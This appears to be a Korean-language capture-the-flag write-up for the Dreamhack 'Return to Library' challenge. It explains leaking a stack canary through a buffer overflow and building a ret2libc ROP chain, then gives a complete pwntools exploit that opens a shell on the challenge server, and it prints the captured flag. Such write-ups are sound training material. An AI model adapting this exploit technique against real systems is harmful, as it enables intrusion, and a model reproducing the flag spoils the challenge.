<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <h1> Dreamhack "Return to Library"  Write-UP</h1>
</body>
<br>
<br>
</html>

2025.09.29 풀이

<img width="1280" height="138" alt="image" src="https://github.com/user-attachments/assets/aa8736ee-d11d-463f-96f0-ee667f7934f7" />

해당 문제 파일을 checksec 명령어를 통해 살펴보니, NX 보호 기법이 적용된 것을 알 수 있다. 

<br>

</br> 

<img width="1232" height="1340" alt="image" src="https://github.com/user-attachments/assets/8f99f685-2424-46f4-9e58-a8e4f8b2d31c" />

rtl 파일의 main 함수 부분을 어셈블리하여 살펴보았는데, rbp - 0x40이라고 되어 있는 것을 보아,

buf의 크기는 0x40인 것을 알 수 있다. (카나리가 포함된 크기 기준)

보통 64 기준으로 카나리는 8바이트이므로 카나리를 제외한 크기는 0x38로 추측해볼 수 있다.

이제 익스플로잇 코드를 작성하기 위해 필요한 주소들을 찾아보려고 한다. 

<br>

</br> 

<img width="622" height="60" alt="image" src="https://github.com/user-attachments/assets/1dafba92-e1e2-44b8-9e05-ee8501b6f46d" />

pwndbg에서 p system 명령어를 통해 system 함수의 주소는 0x4005d0인 것을 알 수 있었다. 

<br>

</br> 

<img width="1036" height="162" alt="image" src="https://github.com/user-attachments/assets/30087978-1521-4192-91cc-a5560f06d862" />

ROPgadget 명령어를 통해 pop rdi 가젯의 주소는 0x400853인 것 또한 알 수 있다.

<br>

</br> 

<img width="690" height="156" alt="image" src="https://github.com/user-attachments/assets/e2f36f56-58d2-49c5-8803-8022ba9985b2" />

 pwndbg에서 search 명령어를 통해 /bin/sh의 주소를 0x400874인 것을 알아낼 수 있었다.

<br>

</br> 

<img width="1170" height="800" alt="image" src="https://github.com/user-attachments/assets/be70ef6a-1c83-4a74-9fb7-40d6e6e95f55" />

 <img width="942" height="564" alt="image" src="https://github.com/user-attachments/assets/80edc774-3ff1-4838-abc3-ecbc284263ab" />

다음과 같은 간단한 코드를 통해, 카나리 값을 추출해보았다. 

<br>

</br> 

<img width="940" height="300" alt="image" src="https://github.com/user-attachments/assets/87803bc1-9dcc-41f7-9b77-fc6bc42cbb07" />

그 후, pop rdi 가젯을 넣기 전에 스택을 정렬해야 되기 떄문에 ret 가젯을 알아보았다.

ret 가젯 주소는 0x400596인 것을 알 수 있다. 

<br>

</br> 

```
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')

p = remote('host8.dreamhack.games', 11629)

p.recvline('Buf: ')
dummy = b'A' * 0x39
print(dummy)
p.send(dummy)
p.recvuntil(dummy)
canary_leak = b'\x00' + p.recvn(7)

canary = u64(canary_leak)
print('canray : {}'.format(hex(canary)))

ret = 0x400596
pop_rdi = 0x400853
binsh = 0x400874
system = 0x4005d0

payload = b'A' * 0x38
payload += p64(canary)
payload += b'A' * 0x8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)


p.recvuntil('Buf: ')
p.send(payload)

p.interactive()
```

<img width="1280" height="935" alt="image" src="https://github.com/user-attachments/assets/f3399f4f-0e35-44c9-b5d7-ebd200234541" />

이때까지 찾은 값들을 토대로 다음과 같이 익스플로잇 코드를 작성하였다.

원격 서버에 접속한 후 오버플로우로 카나리 값을 얻고, 이를 페이로드에 넣어 ret으로 스택을

정렬한 후 ROP 체인을 만들어 /bin/sh를 호출하는 코드이다.

이를 실행해보니 flag 값을 얻을 수 있었다.

<br>

</br> 

```
DH{13e0d0ddf0c71c0ac4410687c11e6b00}
```
